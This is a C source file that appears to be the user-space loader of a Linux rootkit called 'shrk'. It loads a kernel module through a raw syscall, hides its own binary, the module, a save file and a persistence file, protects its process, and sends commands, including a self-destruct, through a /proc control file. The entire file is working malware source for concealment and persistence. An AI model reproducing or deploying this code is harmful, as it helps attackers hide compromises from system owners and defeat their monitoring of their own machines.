#include "inc/kernel.h"
#include "inc/cmds.h"
#include "inc/util.h"

#include <stdbool.h>
#include <sys/syscall.h>

#include <libgen.h>
#include <limits.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>

bool kernel_load() {
  char   *hidden_path = NULL;
  bool    ret         = false;
  int64_t err         = 0;
  int     fd          = 0;

  if ((fd = open(SHRK_MODULE_PATH, O_RDONLY)) < 0) {
    debug_err("failed to open the kernel module");
    return false;
  }

  err = syscall(SYS_finit_module, fd, "", 0);
  close(fd);

  if (err != 0 && errno != EEXIST) {
    debug_err("failed to load the kernel module");
    goto end;
  }

  /*

   * normally when we load the module the process gets protected
   * however in debug mode, this is not the case, so lets manually do it

  */
  if (SHRK_DEBUG)
    protect_pid(getpid());

  else {
    // hide the self, the kernel module, save file and the persistence file
    char self[PATH_MAX + 1];

    if (NULL == get_self(self)) {
      debug("failed to obtain self path");
      goto end;
    }

    if (!hide_path(self)) {
      debug("failed to hide self");
      goto end;
    }

    if (!hide_path(SHRK_MODULE_PATH)) {
      debug("failed to hide the module");
      goto end;
    }

    if (!hide_path(SHRK_SAVE_FILE)) {
      debug("failed to hide the save file");
      goto end;
    }

    if (SHRK_PERSIS_FILE[0] != 0 && !hide_path(SHRK_PERSIS_FILE)) {
      debug("failed to hide the persistence file");
      goto end;
    }
  }

  // also hide saved hidden files
  if (!load_hidden()) {
    debug("failed to load hidden files");
    goto end;
  }

  ret = true;
end:
  if (!ret)
    kernel_unload();
  return ret;
}

bool kernel_unload() {
  if (!kernel_send(KERNEL_CMD_DESTRUCT, "\x00", 1))
    return false;

  if (syscall(SYS_delete_module, SHRK_MODULE_NAME, O_NONBLOCK) != 0) {
    debug_err("failed to unload the kernel module");
    return false;
  }

  return true;
}

bool kernel_send(kernel_cmd_t cmd, void *arg, uint64_t len) {
  char cmd_full[len + 1];
  bool ret = true;
  int  pfd = 0;

  if ((pfd = open("/proc/shrk_" SHRK_CLIENT_ID, O_WRONLY)) < 0) {
    debug_err("failed to open the kernel module command interface");
    return false;
  }

  cmd_full[0] = cmd;
  memcpy(cmd_full + 1, arg, len);

  if (write(pfd, cmd_full, sizeof(cmd_full)) != sizeof(cmd_full)) {
    debug_err("failed to write the command");
    ret = false;
  }

  close(pfd);
  return ret;
}
